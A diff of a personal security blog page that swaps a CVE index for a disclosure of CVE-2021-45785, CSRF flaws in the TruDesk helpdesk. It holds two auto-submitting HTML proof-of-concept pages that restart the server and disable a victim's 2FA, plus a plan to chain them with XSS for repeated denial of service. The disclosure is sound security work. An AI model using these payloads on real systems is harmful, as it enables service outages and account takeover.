@@ -6,11 +6,13 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <meta name="generator" content="Hugo 0.92.2" />
-  <link rel="canonical" href="https://1d8.github.io/cves/" />
+  <link rel="canonical" href="https://1d8.github.io/cves/cve_2021_45785/" />
 
   
     
-    <meta name="description" content="Common Vulnerabilities &amp; Exposures (CVEs)">
+    <meta name="description" content="Description There is a CSRF vulnerability which would allow an attacker to restart the server by simply having a victim with the appropriate privileges visit an attacker’s crafted webpage.
+The vulnerability exists when performing a GET request to the /api/v1/admin/restart endpoint
+There is also another CSRF vulnerability which would allow an attacker to disable a victim’s 2FA (/api/v1/users/&lt;user ID&gt;/removel2auth). This requires the victim’s user ID, but this can easily be obtained by simply deleting a conversation with the victim which is a vulnerability that I described here: https://huntr.">
   
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
@@ -60,7 +62,7 @@
 
   
   
-  <title>Common Vulnerabilities &amp; Exposures (CVEs) | </title>
+  <title>CVE-2021-45785 - CSRF on TruDesk | </title>
 </head>
 
   <body>
@@ -255,164 +257,40 @@
       <div class="main-and-footer">
         <div>
           
-<main id="main">
-  <h1>Common Vulnerabilities &amp; Exposures (CVEs)</h1>
-  
-  <input
-    id="search"
-    type="text"
-    placeholder="Search by title..."
-    aria-label="Search by title"
-  />
-  
-  <ul class="patterns-list" id="list">
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2023_1541/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2023-1541 - Admin Able To Perform Operations On Themselves By Interacting With API Answer
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2022_4804/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2022-4804 - Unauthorized Attacker Can Change Visibility Status of Victim&#39;s Memos
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2022_0372/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2022-0372 - XSS Crater-Invoice
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2022_0083/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2022-0083 - Generation of Error Message Containing Sensitive Information LiveHelperChat
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2021_45785/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2021-45785 - CSRF on TruDesk
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2021_4177/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2021-4177 - Generation of Error Message Containing Sensitive Information LiveHelperChat
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2021_30147/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2021-30147 - CSRF
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2021_29012/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2021-29012 - Broken Session Management
-        </a>
-      </h2>
-    </li>
-    
-    <li>
-      <h2>
-        <a href="/cves/cve_2021_29011/">
-          <svg
-            class="bookmark"
-            aria-hidden="true"
-            viewBox="0 0 40 50"
-            focusable="false"
-          >
-            <use href="#bookmark"></use>
-          </svg>
-          CVE-2021-29011 - XSS
-        </a>
-      </h2>
-    </li>
-    
-  </ul>
-</main>
+  <main id="main">
+    <h1>CVE-2021-45785 - CSRF on TruDesk</h1>
+    <h1 id="description">Description</h1>
+<p>There is a CSRF vulnerability which would allow an attacker to restart the server by simply having a victim with the appropriate privileges visit an attacker&rsquo;s crafted webpage.</p>
+<p>The vulnerability exists when performing a GET request to the /api/v1/admin/restart endpoint</p>
+<p>There is also another CSRF vulnerability which would allow an attacker to disable a victim&rsquo;s 2FA (<code>/api/v1/users/&lt;user ID&gt;/removel2auth</code>). This requires the victim&rsquo;s user ID, but this can easily be obtained by simply deleting a conversation with the victim which is a vulnerability that I described here: <a href="https://huntr.dev/bounties/74c6f886-2869-4b32-bef3-2cb3991a9311">https://huntr.dev/bounties/74c6f886-2869-4b32-bef3-2cb3991a9311</a></p>
+<h1 id="proof-of-concept-poc">Proof of Concept (PoC)</h1>
+<p>For resetting the server</p>
+<pre><code class="language-html">//serverReset.html
+&lt;html&gt;
+    &lt;form action=&quot;https://docker.trudesk.io/api/v1/admin/restart&quot; method=&quot;GET&quot;/&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>For disabling 2FA</p>
+<pre><code class="language-html">&lt;html&gt;
+   &lt; -- change the user ID to the user ID of the victim for which you're disabling 2FA -- &gt;
+    &lt;form action=&quot;https://docker.trudesk.io/api/v1/users/&lt;user ID&gt;/removel2auth&quot; method=&quot;POST&quot;/&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="impact">Impact</h1>
+<p>This vulnerability is capable of performing a DoS attack on the server which can have a major business impact. It can be paired with the XSS vulnerability that I found &amp; reported previously to create an even more effective DoS attack.</p>
+<p>For example, an attacker could craft an XSS payload that would automatically redirect a victim to their webpage where the CSRF attack that restarts the server would take place. The attacker could spam the victim with messages that contain the XSS payload. Then each time the attacker opens the message, the victim would be redirected &amp; the CSRF attack would take place and the server would restart.</p>
+<h1 id="references">References</h1>
+<ul>
+<li><a href="https://huntr.com/bounties/af3ecce4-840f-445e-98d0-11557cd8de1f">https://huntr.com/bounties/af3ecce4-840f-445e-98d0-11557cd8de1f</a></li>
+</ul>
+
+  </main>
 
           
             <footer role="contentinfo">
